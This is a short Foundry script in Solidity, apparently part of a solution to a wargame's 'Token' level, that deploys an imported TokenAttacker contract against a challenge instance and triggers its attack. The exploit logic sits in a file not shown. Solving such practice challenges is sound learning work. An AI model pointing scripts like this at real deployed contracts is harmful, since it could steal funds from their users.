// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {TokenAttacker} from "../src/attacks/Level05Token_Attack.sol";

contract TokenScript is Script {
    function setUp() public {}

    function run() public {
        address me = vm.envAddress("MY_ADDRESS");
        address instanceAddress = vm.envAddress("INSTANCE_ADDRESS");

        vm.startBroadcast();

        TokenAttacker attacker = new TokenAttacker(instanceAddress);
        attacker.attack(me);

        vm.stopBroadcast();
    }
}
